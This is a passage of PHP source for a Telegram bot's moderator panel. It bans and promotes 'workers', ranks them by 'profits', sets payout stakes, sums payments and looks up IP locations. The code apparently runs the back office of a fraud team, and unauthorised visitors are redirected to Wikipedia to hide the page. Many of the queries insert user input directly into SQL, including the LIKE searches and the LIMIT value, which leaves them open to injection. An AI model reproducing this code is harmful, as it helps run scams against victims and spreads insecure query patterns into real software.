									mysqli_query($connection, "UPDATE `trackcodespek` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");
									mysqli_query($connection, "UPDATE `trackcodespost` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");
									
									send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));
									send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));
									$text = sprintf($moder_chat['ban']['messages']['success_a'], $message['from'], $message['firstname'], $message['lastname'], $user_id);
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = $moder_chat['ban']['messages']['success_u'];
									send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									mysqli_query($connection, "INSERT INTO `accounts` (`username`, `telegram`, `access`, `stake`, `created`) VALUES ('username', '$user_id', '-1', '0', '".time()."')");
									send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));
									send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));
									$text = $moder_chat['ban']['errors']['not_exists'];
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = sprintf($moder_chat['ban']['messages']['ban_user'], $message['from'], $message['firstname'], $message['lastname'], $user_id, $user_id);
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							}
						} else {
							$text = $moder_chat['ban']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/^\/unban/i', $message['text']) == TRUE) {
						if(preg_match('/^\/unban \d+$/i', $message['text']) == TRUE) {
							$user_id = mb_substr($message['text'], 7);
							
							$query = mysqli_query($connection, "SELECT `id`, `access` FROM `accounts` WHERE `telegram` = '$user_id'");
							
							if(mysqli_num_rows($query) > 0) {
								$user = mysqli_fetch_assoc($query);
								
								if($user['access'] <= 0) {
									mysqli_query($connection, "UPDATE `accounts` SET `access` = '0', `warns` = '0' WHERE `telegram` = '$user_id'");
									
									send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id));
									send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id));
									$text = sprintf($moder_chat['unban']['messages']['success_a'], $message['from'], $message['firstname'], $message['lastname'], $user_id);
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = $moder_chat['unban']['messages']['success_u'];
									send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id));
									send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id));
									$text = $moder_chat['unban']['messages']['not_ext_unban'];
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = $moder_chat['unban']['errors']['not_exists'];
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = $moder_chat['unban']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/\/stats/i', $message['text']) == TRUE) {
						$total['workers'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` > '0'"));
						$total['users'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` = '0'"));
						$total['banned'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` < '0'"));
						$total['withCard'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` > '0'"));
						$total['withOutCard'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` > '0'"));
						$total['today'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` > '0' AND DATE_FORMAT(FROM_UNIXTIME(`created`), '%d.%m.%Y') = '".date("d.m.Y")."'"));
						
						$payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `status` = '1'"));
						$mpayments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `status` = '1' AND DATE_FORMAT(FROM_UNIXTIME(`time`), '%m.%Y') = '".date("m.Y")."'"));
						$tpayments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `today` FROM `payments` WHERE `status` = '1' AND DATE_FORMAT(FROM_UNIXTIME(`time`), '%d.%m.%Y') = '".date("d.m.Y")."'"));
						if(empty($tpayments['today'])) { $tpayemnts['today'] = '0';}
						
						$total['adverts'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `adverts`"));
						$total['activeAdverts'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `adverts` WHERE `status` = '1'"));
						$total['deletedAdverts'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `adverts` WHERE `status` = '-1'"));
						
						$text = str_replace("\t", "", sprintf($moder_chat['stats']['template'],
							Endings($total['workers'], "воркер", "воркера", "воркеров"),
							Endings($total['users'], "воркер", "воркера", "воркеров"),
							Endings($total['banned'], "воркер", "воркера", "воркеров"),
							Endings($total['today'], "воркер", "воркера", "воркеров"),
							$payments['count'],
							$payments['total'],
							$mpayments['count'],
							$mpayments['total'],
							$tpayments['count'],
							$tpayments['today'],
							Endings($total['adverts'], "объявление", "объявления", "объявлений"),
							Endings($total['activeAdverts'], "объявление", "объявления", "объявлений"),
							Endings($total['deletedAdverts'], "объявление", "объявления", "объявлений")
						));
						
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}
					
					if(preg_match('/\/top/i', $message['text']) == TRUE) {
						if(preg_match('/\/top \d{1,4}/i', $message['text']) == TRUE) {
							$count = substr($message['text'], 4);
							$tops = mysqli_query($connection, "SELECT `worker`, SUM(`amount`) AS total from payments WHERE `status` = '1' group by `worker` order by total DESC LIMIT $count");
							$i = 0;
							$profits = '';
							while( $row = mysqli_fetch_assoc($tops) ){
								$i++;
						        $user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `username`,`telegram` FROM `accounts` WHERE `telegram` = '$row[worker]'"));
						        $profit =  mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS count FROM `payments` WHERE `worker` = '$row[worker]' AND `status` = '1'"));
						        $profits .= sprintf($moder_chat['top']['template'], $i, $user['telegram'], $user['telegram'], $row['total'], Endings($profit['count'], "профит", "профита", "профитов"));
						    }
						    $text = str_replace("\t", "", sprintf($moder_chat['top']['header'], $count, $profits));
						    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}else{
							$text = $moder_chat['top']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/^\/setmoder/i', $message['text']) == TRUE) {
						if(preg_match('/^\/setmoder (\d+|[a-zA-Z0-9@._]+)$/i', $message['text']) == TRUE) {
						    $user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `access` FROM `accounts` WHERE `telegram` = '$message[from]'"));
							if($user['access'] >= 666) {
								$search = str_replace('@', '', mb_substr($message['text'], 10));
								$query = mysqli_query($connection, "SELECT `username`, `telegram` FROM `accounts` WHERE `telegram` = '$search' OR `username` LIKE '%$search%'");
								if(mysqli_num_rows($query) > 0) {
									$user = mysqli_fetch_assoc($query);
									mysqli_query($connection, "UPDATE `accounts` SET `access` = '666' WHERE `telegram` = '$user[telegram]'");
									$text = sprintf($moder_chat['setmoder']['messages']['success_a'], $message['from'], $message['firstname'], $message['lastname'], $user['telegram']);
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = $moder_chat['setmoder']['messages']['success_u'];
									send($config['token'], 'sendMessage', Array('chat_id' => $user['telegram'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = $moder_chat['setmoder']['errors']['not_exists'];
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = $moder_chat['setmoder']['errors']['permissons'];
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = $moder_chat['setmoder']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/\/setsupport/i', $message['text']) == TRUE) {
						if(preg_match('/\/setsupport (\d+|[a-zA-Z0-9@._]+)/i', $message['text']) == TRUE) {
							$user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `access` FROM `accounts` WHERE `telegram` = '$message[from]'"));
							if($user['access'] >= 666) {
								if(preg_match('/\/setsupport \d+/i', $message['text']) == TRUE) {
									$search = mb_substr($message['text'], 12);
									$query = mysqli_query($connection, "SELECT `username`, `telegram` FROM `accounts` WHERE `telegram` = '$search'");
								} elseif(preg_match('/\/setsupport [a-zA-Z0-9@._]+/i', $message['text']) == TRUE) {
									$search = str_replace('@', '', mb_substr($message['text'], 12));
									$query = mysqli_query($connection, "SELECT `username`, `telegram` FROM `accounts` WHERE `username` LIKE '%$search%'");
								}
								
								if(mysqli_num_rows($query) > 0) {
									$user = mysqli_fetch_assoc($query);
									mysqli_query($connection, "UPDATE `accounts` SET `access` = '100' WHERE `telegram` = '$user[telegram]'");
									
									$text = sprintf($moder_chat['setsupport']['messages']['success_a'], $message['from'], $message['firstname'], $message['lastname'], $user['telegram']);
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = $moder_chat['setsupport']['messages']['success_u'];
									send($config['token'], 'sendMessage', Array('chat_id' => $user['telegram'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = $moder_chat['setsupport']['errors']['not_exists'];
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = $moder_chat['setsupport']['errors']['permissons'];
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = $moder_chat['setsupport']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/^\/stake/i', $message['text']) == TRUE) {
						if(preg_match('/^\/stake [0-9]{1,3};[0-9]{1,3}$/i', $message['text']) == TRUE) {
							$stake = explode(';', mb_substr($message['text'], 7));
							
							if($stake[0] <= 100 AND $stake[1] <= 100) {
								$curStake = explode(':', $settings['stake']);
								mysqli_query($connection, "UPDATE `config` SET `stake` = '$stake[0]:$stake[1]'");
								mysqli_query($connection, "UPDATE `accounts` SET `stake` = '$stake[0]:$stake[1]'");
								
								$text = sprintf($moder_chat['stake']['messages']['success_u'], $stake[0], $stake[1]);
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['workers'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								$text = sprintf($moder_chat['stake']['messages']['success_a'], $message['from'], $message['firstname'], $message['lastname'], $curStake[0], $curStake[1], $stake[0], $stake[1]);
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $moder_chat['stake']['errors']['invalid_stake'];
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = $moder_chat['stake']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/^\/setstake/i', $message['text']) == TRUE) {
						if(preg_match('/^\/setstake (\d+|@{0,1}[\w.]+);[0-9]{1,3};[0-9]{1,3}$/i', $message['text']) == TRUE) {
							$settings = explode(';', mb_substr($message['text'], 10));
							
							if(preg_match('/\d+/i', $settings[0]) == TRUE) {
								$search = $settings[0];
								$query = mysqli_query($connection, "SELECT `id`, `stake`, `telegram` FROM `accounts` WHERE `telegram` = '$search'");
							} elseif(preg_match('/(@{0,1}[\w.]+)/i', $settings[0]) == TRUE) {
								$search = str_replace('@', '', $settings[0]);
								$query = mysqli_query($connection, "SELECT `id`, `stake`, `telegram` FROM `accounts` WHERE `username` LIKE '%$search%'");
							}
							
							if(mysqli_num_rows($query) > 0) {
								$stake = "$settings[1]:$settings[2]";
								$stake = explode(':', $stake);
								
								if($stake[0] <= 100 AND $stake[1] <= 100) {
									$user = mysqli_fetch_assoc($query);
									mysqli_query($connection, "UPDATE `accounts` SET `stake` = '$stake[0]:$stake[1]' WHERE `telegram` = '$user[telegram]'");
									
									$curStake = explode(':', $user['stake']);
									
									$text = sprintf($moder_chat['setstake']['messages']['success_u'], $curStake[0], $curStake[1], $stake[0], $stake[1]);
									send($config['token'], 'sendMessage', Array('chat_id' => $user['telegram'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = sprintf($moder_chat['setstake']['messages']['success_a'], $message['from'], $message['firstname'], $message['lastname'], $settings[0], $curStake[0], $curStake[1], $stake[0], $stake[1]);
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = $moder_chat['setstake']['errors']['invalid_stake'];
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = $moder_chat['setstake']['errors']['not_exists'];
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = $moder_chat['setstake']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/\/info/i', $message['text']) == TRUE) {
						if(preg_match('/\/info (\d+|@{0,1}[\w.]+)/i', $message['text']) == TRUE) {
							if(preg_match('/\/info \d+/i', $message['text']) == TRUE) {
								$search = mb_substr($message['text'], 6);
								$query = mysqli_query($connection, "SELECT `username`, `telegram`, `stake`, `access`, `warns`, `created` FROM `accounts` WHERE `telegram` = '$search'");
							} elseif(preg_match('/\/info @{0,1}[\w.]+/i', $message['text']) == TRUE) {
								$search = str_replace('@', '', mb_substr($message['text'], 6));
								$query = mysqli_query($connection, "SELECT `username`, `telegram`, `stake`, `access`, `warns`, `created` FROM `accounts` WHERE `username` LIKE '%$search%'");
							}
							
							if(mysqli_num_rows($query) > 0) {
								$user = mysqli_fetch_assoc($query);
								
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => getMyProfile($user['telegram'], 1), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getMyProfile($user['telegram'], 1, 1)));
							} else {
								$text = sprintf($moder_chat['info']['errors']['not_exists'], $search);
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = $moder_chat['info']['messages']['info'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/\/minprice/i', $message['text']) == TRUE) {
						if(preg_match('/^\/minprice \d+$/i', $message['text']) == TRUE) {
							$price = mb_substr($message['text'], 10);
							
							mysqli_query($connection, "UPDATE `config` SET `min_price` = '$price'");
							$text = sprintf($moder_chat['minprice']['messages']['success'], $messages['from'], $message['firstname'], $message['lastname'], $settings['min_price'], $price);
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							$text = $moder_chat['minprice']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/\/maxprice/i', $message['text']) == TRUE) {
						if(preg_match('/^\/maxprice \d+$/i', $message['text']) == TRUE) {
							$price = mb_substr($message['text'], 10);
							
							mysqli_query($connection, "UPDATE `config` SET `max_price` = '$price'");
							$text = sprintf($moder_chat['maxprice']['messages']['success'], $messages['from'], $message['firstname'], $message['lastname'], $settings['max_price'], $price);
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							$text = $moder_chat['maxprice']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/\/msg/i', $message['text']) == TRUE) {
						if(preg_match('/^\/msg (|-)[0-9]+;.+/i', $message['text']) == TRUE) {
							$msg = explode(';', mb_substr($message['text'], 5));
							
							$text = $moder_chat['msg']['header'];
							$text = "✉️ <b>Сообщение от модератора:</b>\n\n";
							$text .= str_replace('\\n', '\n', $msg[1]);
							$send = send($config['token'], 'sendMessage', Array('chat_id' => $msg[0], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							
							if($send->ok) {
								$text = $moder_chat['msg']['messages']['success'];
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								$text = sprintf($moder_chat['msg']['messages']['success_a'], $message['from'], $message['firstname'], $message['lastname'], $msg[0], $msg[1]);
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $moder_chat['msg']['messages']['fail'];
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = $moder_chat['msg']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/\/checkip/i', $message['text']) == TRUE) {
						if(preg_match('/\/checkip (\d{2,3}|[.])+/i', $message['text']) == TRUE) {
							$ip = mb_substr($message['text'], 9);
							
							$ipapi = json_decode(file_get_contents("http://ip-api.com/json/$ip"));
							
							if($ipapi->{'status'} == 'success') {
								$text = str_replace("\t", "", sprintf($moder_chat['checkip']['template'], $ip, getCountryFlag($ipapi->{'countryCode'}), $ipapi->{'country'}, $ipapi->{'regionName'}, $ipapi->{'city'}, $ipapi->{'timezone'}, $ipapi->{'isp'}, $ipapi->{'lat'}, $ipapi->{'lon'}));
							} else {
								$text = $moder_chat['checkip']['errors']['not_exists'];
							}
							
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							$text = $moder_chat['checkip']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/\/calculate/i', $message['text']) == TRUE) {
						if(preg_match('/\/calculate \d{3,5}/i', $message['text']) == TRUE) {
							$amount = mb_substr($message['text'], 11);
							$stake = explode(":", $settings['stake']);
							if($amount >= 750 AND $amount <= 1000000) {
								$amount = floor((95*(1/100)*$amount));
								$payout = floor(($stake[0]*(1/100)*($amount))/500)*500;
								$payout2 = floor(($stake[1]*(1/100)*($amount))/500)*500;
								$profit = floor(($amount)-($payout));
								$profit1 = floor($profit/2);

								$text = str_replace("\t", "", sprintf($moder_chat['calculate']['template'], $amount, $payout, $payout2, $profit, $profit1));
								
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $moder_chat['calculate']['errors']['invalid_summ'];
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = $moder_chat['calculate']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
				}
			}
		}
	} else {
		header("Location: https://www.wikipedia.org/");
	}
?>